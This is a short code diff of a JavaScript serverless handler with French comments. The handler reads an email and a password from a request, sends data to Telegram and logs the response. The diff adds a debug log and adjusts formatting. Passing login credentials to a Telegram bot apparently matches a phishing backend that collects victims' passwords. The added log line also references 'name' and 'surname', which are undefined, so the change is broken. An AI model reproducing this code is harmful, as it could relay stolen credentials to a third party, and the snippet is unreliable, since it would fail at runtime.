@@ -8,6 +8,7 @@ export async function handler(event) {
 
   try {
     const { email, password } = JSON.parse(event.body);
+    console.log("Données reçues:", { name, surname });  // Log les données reçues
 
     if (!email || !password) {
       return {
@@ -36,7 +37,7 @@ export async function handler(event) {
       }
     );
     const data = await response.json();
-console.log("Réponse de Telegram:", data);  // Affiche la réponse de Telegram
+    console.log("Réponse de Telegram:", data);  // Affiche la réponse de Telegram
 
     if (!response.ok) {
       throw new Error("Erreur Telegram");
@@ -54,4 +55,5 @@ console.log("Réponse de Telegram:", data);  // Affiche la réponse de Telegram
     };
   }
 }
+
 
